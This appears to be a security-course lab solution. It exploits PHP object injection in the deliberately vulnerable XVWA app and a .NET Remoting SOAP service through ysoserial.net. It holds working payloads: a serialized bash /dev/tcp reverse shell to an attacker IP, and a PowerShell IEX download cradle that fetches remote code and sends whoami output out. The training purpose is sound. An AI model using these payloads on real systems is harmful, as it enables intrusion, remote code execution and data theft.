There is an object in the URL parameter


> If you notice closely, the values present in this parameter - XVWA and Xtreme Vulnerable Web Application are shown on the page.

But what exactly is this object contained in the **r** parameter?

Lets search for it:

Search string:
```bash
a:2:{i:0;s:4:"";i:1;s:33:"";}
```

We have intentionally omitted any references to XVWA to avoid getting results specific to it.


Notice we got back some results indicating it is serialized PHP data.

One of the comments on SO also indicates to use the PHP serialize and unserialize methods on this kind of input:

Let's try to produce similar results using the serialize method from PHP:

Commands:
```bash
php -a
echo serialize("Hello World!");
echo serialize(array('a', 2, 'c', 4, 'e', 6, 'g', 8, 'i', 10));
```


The above commands would do the following:
```bash
php -a: Launch an interactive PHP environment - a REPL (read-eval-print-loop). Here we can run PHP code without having to set up any webserver.
```

The second command serialized the string Hello World!.

The result is simple enough - 
```bash
s:12 
# indicates what follows is a string of 12 characters.
```

The third command goes one step ahead and serializes an array, which is where serialization has its value - more on that shortly.

The output says
```bash
a:10
```bash

, indicating what follows is an array of size 10. Then we have all the elements of the array. Each array elements index and value are indicated. For instance, lets consider the first two elements:

```bash
i:0;s:1:"a"
# Element at index 0 is a string of size 1 and that string is "a".
i:0;i:2
# Element at index 1 is an integer and it's value is 2.
```

> Hopefully, this makes much more sense now.

What's serialization?

- Sometimes you get to situations where you have to pass objects over the network, or the state of a program is to be stored for later use. How can you do that, provided that the information is present in an object?

- One possibility is to save all the object's properties and then populate them back later. That would be good, but it would be reinventing the wheel and would not be as optimized and compact as it could have been. Serialized objects must also later be deserialized. Since this is a standard requirement, it is built-in into the programming languages like Java, PHP, and the like.

> Now that we know the parameter we saw in the URL was actually a PHP serialized object, let's figure it out using what we learned above:

Commands:
```bash
php -a
echo unserialize('a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}');
var_dump(unserialize('a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}'));
```


We run the PHP code from the interactive mode and unserialize the PHP object. Notice that it is an associative array having two items.

Check the PHP manual for unserialize:

Notice the big red warning message. It's a clear warning to the developers about the RCE threat if they pass user-controlled input to the
unserialize function.

Step 7: Check the source code of the PHP Object Injection page from Github.
```bash
URL: https://github.com/s4n7h0/xvwa/blob/master/vulnerabilities/php_object_injection/home.php
```

Notice the relevant code snippet shown in the above image. If the request contains the parameter **r**, its value is unserialized. Also, notice the call to **eval** - the inject parameter is directly passed to **eval**, which is an excellent opportunity for RCE.

Step 8: Exploit the insecure PHP deserialization vulnerability.

Save the following code snippet as object.php

```php
<?php
class PHPObjectInjection {
    public $inject = "system('id');";
}

$obj = new PHPObjectInjection();
var_dump(serialize($obj));
?>

```


Notice the above code snippet sets the inject parameter to system('id'), which would run the id command on the webserver.

Serialize the object:

Command:
```bash
php object.php
```



Serialized payload:
```bash
O:18:"PHPObjectInjection":1:{s:6:"inject";s:13:"system('id');";}
```

- Assign the generated value in the **r** parameter in the URL:


Notice the results of the id command are shown on the page.

With that, we successfully exploited the insecure deserialization issue to run arbitrary commands.

Step 9: Check the list of running processes.

Now that we have code execution on the target server, let's check the list of running processes:

Save the following code snippet as object.php

```php
<?php
class PHPObjectInjection {
    public $inject = "system('ps aux');";
}

$obj = new PHPObjectInjection();
var_dump(serialize($obj));
?>

```


Serialize the object:

Command:
```bash
php object.php
```

Serialized payload:
```bash
O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('ps aux');";}
```

Assign the generated value in the **r** parameter in the URL:



The process listing is retrieved, as shown in the above image.

Check the page source for a better-formatted response (press CTRL+U):


Step 10: Obtain a reverse shell.

Running single commands is good, but it requires us to generate the serialized value every time.

> Let's get a reverse shell to avoid that.

Before moving on to the payload generation part, retrieve the IP address of the attacker machine:

Command:
```bash
ip addr
```


The IP address of the attacker machine is 192.222.13.2


> [Note] The IP address is bound to change with every lab run. Kindly make sure to replace the IP address used in the payload. Otherwise, the payload wouldn't work.

Save the following code snippet as object.php

```php
<?php
class PHPObjectInjection {
    public $inject = "system('/bin/bash -c \'bash -i >& /dev/tcp/192.222.13.2/54321 0>&1\'');";
}

$obj = new PHPObjectInjection();
var_dump(serialize($obj));
?>

```



Serialize the object:

Command:
```php
php object.php
```


Serialized payload:
```php
O:18:"PHPObjectInjection":1:{s:6:"inject";s:71:"system('/bin/bash -c \'bash -i >& /dev/tcp/192.222.13.2/54321 0>&1\'');";}
```

Start a Netcat listener on port 54321 (since we specified this port in the reverse shell payload as well):

Command:
```bash
nc -lvp 54321
```


Assign the generated value in the **r** parameter in the URL:


It didn't work. But why is that?

It is because the serialized payload contains characters like **/** and **&** which are treated specially by the web browser and the server.

> To avoid that, we will encode the serialized payload.

You can use Burp to do that or use websites like https://www.url-encode-decode.com/ to get the job done:


URL-encoded serialized payload:
```bash
O%3A18%3A%22PHPObjectInjection%22%3A1%3A%7Bs%3A6%3A%22inject%22%3Bs%3A71%3A%22system%28%27%2Fbin%2Fbash+-c+%5C%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.222.13.2%2F54321+0%3E%261%5C%27%27%29%3B%22%3B%7D
```

> [Note] Make sure not to copy this payload as is, since the IP would be different for the attacker machine assigned to you.

Assign the URL-encoded payload in the **r** parameter in the URL:


Check the terminal where the Netcat listener was running:


> We have gained a reverse shell!

Now we can run commands without having to generate command payloads every single time:

Commands:
```bash
id
pwd
ls -al
```


With that, we conclude this lab on Insecure PHP Deserialization also known as PHP Object Injection.

> We learned about serialization and deserialization, how to generate serialized values, and how to unserialize them. We also reviewed the PHP code and uncovered the use of a code execution sink, namely the eval function. 

> Finally, we exploited the vulnerable code by generating malicious serialized objects to gain command execution on the target server.

References:
```
- XVWA = https://github.com/s4n7h0/xvwa
- PHP Associative Arrays = https://www.w3schools.com/PHP/php_arrays_associative.asp
- PHP Serialize = https://www.php.net/manual/en/function.serialize.php
- PHP Unserialize = https://www.php.net/manual/en/function.unserialize.php
```


## Lab 4
Solutions

Below, you can find solutions for each task. Remember though, that you can follow your own strategy, which may be different from the one explained in the following lab.

Task 1. Perform reconnaissance and find a soap-based web service

A port scan reveals two possible candidates (see below).
```bash
nmap -sV -p- demo.ine.local -T4 --open -v -Pn
```


The results are:
```bash
Not shown: 62690 closed tcp ports (reset), 2831 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1234/tcp  open  http               MS .NET Remoting httpd (.NET CLR 4.0.30319.42000)
3389/tcp  open  ssl/ms-wbt-server?
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
49192/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```


Examining the service on port 80 shows a frame that fails to be loaded.

The service on port 1234 reacts to a simple SOAP message.

> [Note] That it is a valid service endpoint, since when requesting an incorrect path the error mentions **Requested Service not found**.

Task 2. Execute code on remote machine

Lets use ysoserial.net to generate a payload in SoapFormat, in an attempt to identify if the remote service is vulnerable.
```bash
Note that you might need to remove \<SOAP:Body> tags from the resulting payload before testing.
```

Also note that you need a Windows OS on which you will run the ysoserial.net binary with the below command:
```bash
ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -c "cmd /c [command]" -o raw
```

The .NET serialization protocol in this case does not verify the length of the command string, it will thus be possible to interfere with it after generating the payload. The payload is then copied to Burp with the following changes:

- As said before, Soap Body tags should be removed

- In order to have a valid soap message, a dummy SOAPAction header is required. This is related to SOAP and not related to this specific lab

- The content type should be text/xml like in every SOAP request

- If you are receiving an error stating **Requested service was not found**, you might also need to clear some whitespaces / newlines

Blind Code execution can be confirmed, for example, using ping.

For that, we need the IP address of the attacker machine:

Command:
```bash
ip addr
```



Request:
```bash
POST /VulnerableEndpoint.rem HTTP/1.1
Host: demo.ine.local:1234
SOAPAction: something
Content-type: text/xml
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://demo.ine.local/
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 1478

<SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                   xmlns:xsd="http://www.w3.org/2001/XMLSchema"
                   xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
                   xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
                   xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0"
                   SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <a1:TextFormattingRunProperties id="ref-1"
                                  xmlns:a1="http://schemas.microsoft.com/clr/nsassem/Microsoft.VisualStudio.Text.Formatting/Microsoft.PowerShell.Editor%2C%20Version%3D3.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3D31bf3856ad364e35">
    <ForegroundBrush id="ref-3">
      &lt;ResourceDictionary
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:System="clr-namespace:System;assembly=mscorlib"
        xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system"&gt;
        &lt;ObjectDataProvider x:Key="" ObjectType="{x:Type Diag:Process}" MethodName="Start" &gt;
          &lt;ObjectDataProvider.MethodParameters&gt;
            &lt;System:String&gt;cmd&lt;/System:String&gt;
            &lt;System:String&gt;"/c ping 10.10.27.2"&lt;/System:String&gt;
          &lt;/ObjectDataProvider.MethodParameters&gt;
        &lt;/ObjectDataProvider&gt;
      &lt;/ResourceDictionary&gt;
    </ForegroundBrush>
  </a1:TextFormattingRunProperties>
</SOAP-ENV:Envelope>


```

> [Note] Make sure to place the IP address of your attacker machine in the above command.


Before sending the above request, use the following command to listen for ICMP requests/replies:

Command:
```bash
tcpdump -i any icmp
```

Send the request to the vulnerable SOAP endpoint:

By the time the crafted request is sent, we can notice ICMP traffic reaching our sniffer from the remote target!


Task 3. Get command output using an out-of-band channel

There are many methods to achieve that goal. We will do the task using PowerShell. First, we will create the following snippet and then host it using Python's SimpleHTTPServer module.
```bash
$c=whoami;curl http://10.10.27.2:445/$c
python3 -m http.server 445
```

> [Note] Make sure to place the IP address of your attacker machine in the above command.


And finally, the following command is injected into the serialized payload:
```powershell
powershell -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.27.2:445/payload.txt')"
```

> [Note] Make sure to place the IP address of your attacker machine in the above command.

The request for out-of-band data exfiltration via command execution is:
```bash
POST /VulnerableEndpoint.rem HTTP/1.1
Host: demo.ine.local:1234
SOAPAction: something
Content-type: text/xml
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://demo.ine.local/
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 1478

<SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                   xmlns:xsd="http://www.w3.org/2001/XMLSchema"
                   xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
                   xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
                   xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0"
                   SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <a1:TextFormattingRunProperties id="ref-1"
                                  xmlns:a1="http://schemas.microsoft.com/clr/nsassem/Microsoft.VisualStudio.Text.Formatting/Microsoft.PowerShell.Editor%2C%20Version%3D3.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3D31bf3856ad364e35">
    <ForegroundBrush id="ref-3">
      &lt;ResourceDictionary
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:System="clr-namespace:System;assembly=mscorlib"
        xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system"&gt;
        &lt;ObjectDataProvider x:Key="" ObjectType="{x:Type Diag:Process}" MethodName="Start" &gt;
          &lt;ObjectDataProvider.MethodParameters&gt;
            &lt;System:String&gt;cmd&lt;/System:String&gt;
            &lt;System:String&gt;"/c powershell -exec Bypass -C \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.27.2:445/payload.txt')\""&lt;/System:String&gt;
          &lt;/ObjectDataProvider.MethodParameters&gt;
        &lt;/ObjectDataProvider&gt;
      &lt;/ResourceDictionary&gt;
    </ForegroundBrush>
  </a1:TextFormattingRunProperties>
</SOAP-ENV:Envelope>


```

> [Note] Make sure to place the IP address of your attacker machine in the above request.


Send the above request from Burp Suite:


> We can see the output of the **whoami** command being transmitted in the HTTP GET parameter. 

> This is because PowerShell fetched the remote resource and then immediately executed it using the IEX command. Note that we haven't even touched the filesystem!

